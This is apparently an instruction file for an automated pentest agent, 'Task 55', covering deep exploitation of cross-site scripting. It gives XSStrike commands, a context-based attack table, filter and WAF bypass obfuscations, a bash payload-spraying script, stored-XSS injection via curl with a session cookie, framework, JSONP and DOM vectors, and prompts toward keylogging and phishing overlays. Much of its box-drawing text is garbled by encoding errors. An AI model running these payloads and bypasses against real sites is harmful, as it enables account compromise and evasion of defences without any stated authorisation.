================================================================================
TASK 55 Â· XSS DEEP EXPLOITATION (XSStrike + WAF Bypass + Stored XSS)
================================================================================
Manual exploitation for reflections that auto-scanners couldn't exploit.
Context-aware payloads, WAF bypass, and stored XSS hunting.

OBJECTIVE:
- Exploit reflection points that Dalfox couldn't auto-exploit
- Bypass WAF/filters with encoding chains and mutations
- Find and exploit stored XSS in persistent data fields
- Generate CUSTOM payloads based on observed context

================================================================================
INPUTS
================================================================================
outputs/queue_xss_manual_exploitation.txt  â† Reflections needing manual work
outputs/xss_reflections_kxss.txt           â† All reflection points
outputs/waf_fingerprints.txt               â† WAF detection results
temp/agent1/reflection_contexts.txt        â† Context analysis from Task 54

================================================================================
MASTER PAYLOAD WORDLIST (896 payloads)
================================================================================
Location: task/task55/wordlists/xss-payloads-master.txt

This wordlist contains comprehensive XSS payloads organized by category:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Category              â”‚ Count â”‚ Use When                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Basic tags            â”‚ ~50   â”‚ First attempt, no filtering detected       â”‚
â”‚ Event handlers        â”‚ ~80   â”‚ When <script> blocked but events work      â”‚
â”‚ WAF bypass variants   â”‚ ~100  â”‚ After detecting filter/WAF                 â”‚
â”‚ Framework-specific    â”‚ ~40   â”‚ Angular {{}}, Vue v-html, React, jQuery    â”‚
â”‚ JSONP gadgets         â”‚ ~20   â”‚ When CSP blocks inline but allows CDNs     â”‚
â”‚ Encoding chains       â”‚ ~50   â”‚ WAF bypass attempts                        â”‚
â”‚ Obfuscation           â”‚ ~100  â”‚ Keyword blocklist bypass                   â”‚
â”‚ Protocol handlers     â”‚ ~20   â”‚ href/src context exploitation              â”‚
â”‚ SVG variants          â”‚ ~25   â”‚ When HTML tags blocked but SVG allowed     â”‚
â”‚ DOM-based             â”‚ ~50   â”‚ Client-side sink exploitation              â”‚
â”‚ Mobile/Touch          â”‚ ~20   â”‚ Mobile-specific contexts                   â”‚
â”‚ Exotic (JSFuck etc)   â”‚ ~30   â”‚ Extreme obfuscation needed                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

âš ï¸ CRITICAL: DO NOT blindly spray all 896 payloads!
   â†’ First UNDERSTAND the context
   â†’ Then SELECT appropriate payloads from wordlist
   â†’ Then GENERATE custom variants if needed

================================================================================
OUTPUTS  
================================================================================
outputs/xss_exploited_manual.txt           â† Manually confirmed XSS
outputs/xss_stored_confirmed.txt           â† Stored XSS findings
outputs/xss_waf_bypassed.txt               â† WAF bypass successes
temp/agent1/xsstrike_results.txt           â† XSStrike scan output

================================================================================
PHASE 1: XSSTRIKE - INTELLIGENT XSS SCANNER
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 Install XSStrike
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip3 install -r requirements.txt

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 Basic XSStrike Usage
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Single URL analysis
python3 xsstrike.py -u "https://target.com/search?q=test" --skip

# Process queue from Task 54
while read url; do
    python3 xsstrike.py -u "$url" --skip >> temp/agent1/xsstrike_results.txt 2>&1
done < outputs/queue_xss_manual_exploitation.txt

# With authentication
python3 xsstrike.py -u "URL" --headers '{"Cookie": "session=XXX"}' --skip

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.3 Use Master Wordlist with XSStrike
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
python3 xsstrike.py -u "URL" --file task/task55/wordlists/xss-payloads-master.txt --skip

================================================================================
PHASE 2: UNDERSTAND CONTEXT BEFORE ATTACKING
================================================================================
ğŸš¨ THIS IS THE MOST IMPORTANT PHASE ğŸš¨

Before using ANY payload, you MUST identify WHERE input reflects.
Different contexts require DIFFERENT payloads.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Context Detection Methodology
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Step 1: Send unique marker
curl -s "https://target.com/search?q=XSSMARKER123"

# Step 2: Find marker in response
# Look at the HTML around XSSMARKER123

# Step 3: Identify context type (see below)

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 Context Types & Attack Strategy
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ CONTEXT TYPE          â”‚ HOW IT LOOKS              â”‚ ATTACK STRATEGY        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ HTML Body             â”‚ <div>USER_INPUT</div>     â”‚ Inject new tag         â”‚
â”‚                       â”‚                           â”‚ â†’ grep "^<" wordlist   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ HTML Attribute        â”‚ <input value="USER_INPUT">â”‚ Break out with " or '  â”‚
â”‚                       â”‚                           â”‚ â†’ Need quote first     â”‚
â”‚                       â”‚                           â”‚ â†’ Then inject event    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ JavaScript String     â”‚ var x = "USER_INPUT";     â”‚ Break string + inject  â”‚
â”‚                       â”‚                           â”‚ â†’ Close with " or '    â”‚
â”‚                       â”‚                           â”‚ â†’ Add ; + code         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ JavaScript Template   â”‚ `Hello ${USER_INPUT}`     â”‚ Use ${} injection      â”‚
â”‚                       â”‚                           â”‚ â†’ ${alert(1)}          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ URL/href Context      â”‚ <a href="USER_INPUT">     â”‚ javascript: protocol   â”‚
â”‚                       â”‚                           â”‚ â†’ javascript:code()    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Event Handler         â”‚ onclick="fn('USER_INPUT')"â”‚ Break out of function  â”‚
â”‚                       â”‚                           â”‚ â†’ ');code();//         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ CSS Context           â”‚ style="color: USER_INPUT" â”‚ Break out or use expr  â”‚
â”‚                       â”‚                           â”‚ â†’ </style><svg...      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ HTML Comment          â”‚ <!-- USER_INPUT -->       â”‚ Close comment first    â”‚
â”‚                       â”‚                           â”‚ â†’ --><svg onload=      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Script Block          â”‚ <script>...USER_INPUT     â”‚ Close script first     â”‚
â”‚                       â”‚                           â”‚ â†’ </script><svg...     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 Filter Detection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
After identifying context, test what's BLOCKED:

# Test individual characters
< > " ' / \ ( ) = ; : 

# Test keywords
script alert onerror onload javascript eval

# Test combinations
<script> onerror= javascript:

Document what's blocked â†’ This guides your bypass strategy.

================================================================================
PHASE 3: PAYLOAD SELECTION FROM WORDLIST
================================================================================
Based on context + filter detection, select appropriate payloads.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 Filter Wordlist by Context
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# HTML body context - look for tag injection
grep -E "^<[a-zA-Z]" task/task55/wordlists/xss-payloads-master.txt

# Attribute breakout - look for " or ' starters
grep -E '^["'"'"']' task/task55/wordlists/xss-payloads-master.txt

# JavaScript context - look for string breakers
grep -E "^['\"];|^\$\{" task/task55/wordlists/xss-payloads-master.txt

# WAF bypass - encoding variants
grep -iE "%[0-9a-f]{2}|&#[0-9]+;|\\\\u00" task/task55/wordlists/xss-payloads-master.txt

# Framework specific
grep -iE "\{\{|v-html|dangerouslySetInnerHTML" task/task55/wordlists/xss-payloads-master.txt

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 Automated Context-Based Testing
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# context_xss_test.sh

URL="$1"
CONTEXT="$2"  # body, attr, js, url

case $CONTEXT in
    body)
        grep -E "^<[a-zA-Z]" task/task55/wordlists/xss-payloads-master.txt
        ;;
    attr)
        grep -E '^["'"'"'].*on[a-z]+=' task/task55/wordlists/xss-payloads-master.txt
        ;;
    js)
        grep -E "^['\"];" task/task55/wordlists/xss-payloads-master.txt
        ;;
    url)
        grep -iE "^javascript:|^data:" task/task55/wordlists/xss-payloads-master.txt
        ;;
esac | while read payload; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    response=$(curl -s "$URL$encoded")
    if echo "$response" | grep -qiE "alert|onerror|onload"; then
        echo "[POSSIBLE] $payload"
    fi
done

================================================================================
PHASE 4: GENERATE CUSTOM PAYLOADS
================================================================================
ğŸ§  When wordlist fails, CREATE your own payload based on observations.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 Payload Generation Logic
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

STEP 1: What characters are ALLOWED?
        â†’ Build payload using only those

STEP 2: What keywords are BLOCKED?
        â†’ Use alternatives or obfuscation

STEP 3: What context are you in?
        â†’ Determine what needs to be closed/escaped

STEP 4: Combine into custom payload

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 Example: Generating Custom Payload
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SCENARIO: 
- Context: HTML attribute <input value="USER_INPUT">
- Blocked: <script>, onerror, alert, double quotes
- Allowed: Single quotes, other events, other functions

THINKING:
1. Can't use " to break out â†’ But attribute uses " so test if unescaped
2. onerror blocked â†’ Try onfocus, onmouseover, ontoggle, etc.
3. alert blocked â†’ Try prompt, confirm, print, eval, fetch
4. Need autofocus to trigger without interaction

GENERATED PAYLOAD:
' onfocus=prompt(1) autofocus='

OR MORE OBFUSCATED:
' onfocus=window['pro'+'mpt'](1) autofocus='

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.3 Obfuscation Building Blocks
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
REPLACE "alert" WITH:
  â†’ prompt / confirm / console.log / print
  â†’ window['al'+'ert']
  â†’ eval('al'+'ert(1)')
  â†’ []['constructor']['constructor']('alert(1)')()
  â†’ Function('alert(1)')()
  â†’ setTimeout('alert(1)',0)
  â†’ setInterval('alert(1)',1000)
  â†’ Reflect.construct(Function,['alert(1)'])()

REPLACE <script> WITH (event-based execution):
  â†’ <svg onload=...>
  â†’ <img src=x onerror=...>
  â†’ <body onload=...>
  â†’ <input onfocus=... autofocus>
  â†’ <details open ontoggle=...>
  â†’ <marquee onstart=...>

IF () BLOCKED:
  â†’ alert`1`              (backticks)
  â†’ onerror=alert         (without calling)
  â†’ throw/catch tricks
  â†’ Set handler: img.onerror=alert;img.src='x'

IF QUOTES BLOCKED:
  â†’ /regex/.source
  â†’ String.fromCharCode(97,108,101,114,116)
  â†’ Backticks `template`
  â†’ No quotes in some contexts

IF SPACES BLOCKED:
  â†’ Use / as separator: <svg/onload=alert(1)>
  â†’ Use tabs %09 or newlines %0a
  â†’ Comments: <svg/**/onload=alert(1)>

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.4 Encoding Your Custom Payload
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
After creating payload, try different encodings:

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('<svg>'))"
# Output: %3Csvg%3E

# Double URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('%3Csvg%3E'))"
# Output: %253Csvg%253E

# HTML entity encode (decimal)
# < = &#60;
# > = &#62;
# " = &#34;

# HTML entity encode (hex)
# < = &#x3C;
# > = &#x3E;

# Unicode escape (for JS contexts)
# < = \u003c
# > = \u003e
# ' = \u0027

================================================================================
PHASE 5: STORED XSS HUNTING
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 High-Value Stored XSS Targets
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Profile fields:     Display name, bio, website URL, signature
User content:       Comments, reviews, forum posts, messages
Admin-visible:      Support tickets, feedback, error reports
Headers:            User-Agent (often logged), Referer
File metadata:      Upload filenames, descriptions

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 Stored XSS Testing Method
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# 1. Inject with unique identifier
MARKER="STORED$(date +%s)"
PAYLOAD="<img src=x onerror=alert('$MARKER')>"

# 2. Submit to stored field
curl -X POST "https://target.com/profile" \
    -H "Cookie: session=XXX" \
    -d "bio=$PAYLOAD"

# 3. View from different session / as different user
# 4. Check if payload executes

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.3 Stored XSS - Length Limits
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Many stored contexts have length limits. Know the SHORTEST payloads:

20-25 chars:  <svg/onload=alert()>
25-30 chars:  <img src=x onerror=alert(1)>
~20 chars:    <body onload=alert()>

If very limited, consider:
- External script loading (if CSP allows)
- Splitting payload across multiple fields

================================================================================
PHASE 6: SPECIAL CASES
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.1 Framework Detection & Exploitation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
CHECK RESPONSE FOR:
- "ng-" attributes     â†’ Angular â†’ Use {{constructor.constructor('alert(1)')()}}
- "v-" directives      â†’ Vue.js â†’ Use v-html injection
- "__NEXT_DATA__"      â†’ Next.js â†’ Check JSON injection
- "react" in scripts   â†’ React â†’ Check dangerouslySetInnerHTML patterns

FILTER WORDLIST:
grep -iE "angular\|{{\|constructor.constructor" task/task55/wordlists/xss-payloads-master.txt
grep -iE "v-html\|v-bind" task/task55/wordlists/xss-payloads-master.txt
grep -iE "dangerouslySetInnerHTML\|__html" task/task55/wordlists/xss-payloads-master.txt

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.2 JSONP Exploitation (CSP Bypass)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
If CSP blocks inline scripts but allows certain CDNs:

CHECK WORDLIST FOR JSONP GADGETS:
grep -i "googleapis\|google.com\|twitter\|youtube\|github" task/task55/wordlists/xss-payloads-master.txt

These exploit callback parameters on trusted domains.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.3 DOM-Based XSS
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Not in HTTP response but in client-side JS processing:

COMMON SINKS:
- document.write(location.hash)
- element.innerHTML = url_param
- eval(user_input)
- jQuery(location.hash)

TEST:
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page?xss=<svg onload=alert(1)>

SEARCH JS FILES FOR SINKS:
grep -rE "innerHTML|outerHTML|document\.write|eval\(" --include="*.js"

================================================================================
ğŸ§  YOU ARE AN INTELLIGENT AGENT - THINK BEFORE TESTING ğŸ§ 
================================================================================

âš ï¸ DO NOT just spray all 896 payloads blindly!

CORRECT APPROACH:

1ï¸âƒ£ OBSERVE THE RESPONSE
   - Send test input: ?param=XSSTEST123
   - Find where XSSTEST123 appears in HTML
   - Identify the CONTEXT (body, attribute, JS, etc.)

2ï¸âƒ£ TEST FILTER BEHAVIOR
   - Which characters get blocked/encoded?
   - Which keywords get stripped?
   - Is there a WAF? What does it block?

3ï¸âƒ£ SELECT APPROPRIATE PAYLOADS
   - Use grep to filter wordlist by context
   - Don't use JS-context payloads in HTML-body context
   - Don't use <script> if you're inside an attribute

4ï¸âƒ£ GENERATE CUSTOM PAYLOADS
   - If wordlist fails, THINK about WHY
   - What's blocked? What's allowed?
   - Build payload using allowed chars/keywords
   - Try encoding variations

5ï¸âƒ£ DOCUMENT YOUR FINDINGS
   - Working payload + URL
   - Context type
   - What bypass was needed

CREATIVE THINKING EXAMPLES:

Example 1: "alert" is blocked
   â†’ Don't give up!
   â†’ Try: prompt, confirm, console.log
   â†’ Try: window['al'+'ert'](1)
   â†’ Try: eval(atob('YWxlcnQoMSk='))

Example 2: All tags seem blocked
   â†’ Check if SOME tags allowed (svg, math, body)
   â†’ Check if encoding bypasses (<svg â†’ %3Csvg â†’ &#60;svg)
   â†’ Check framework-specific vectors (Angular {{}})

Example 3: Payload works but nothing happens
   â†’ Maybe httpOnly cookie (can't steal)
   â†’ XSS still works! Try: keylogging, phishing overlay, CSRF

REMEMBER:
- Context is EVERYTHING
- 1 smart payload beats 100 random ones
- If something is blocked, there's usually a bypass
- Build your own payload when wordlist fails
- Test your custom payloads with different encodings

================================================================================
SUCCESS CRITERIA
================================================================================
âœ“ Context identified for each reflection point
âœ“ Filter/WAF behavior documented
âœ“ Appropriate payloads selected from wordlist
âœ“ Custom payloads generated where wordlist failed
âœ“ Stored XSS tested in all persistent fields
âœ“ Framework-specific attacks tested if applicable
âœ“ All findings documented with working POC

================================================================================
NEXT TASK
================================================================================
â†’ Task 56: Blind XSS Campaign (admin-triggered XSS via callbacks)
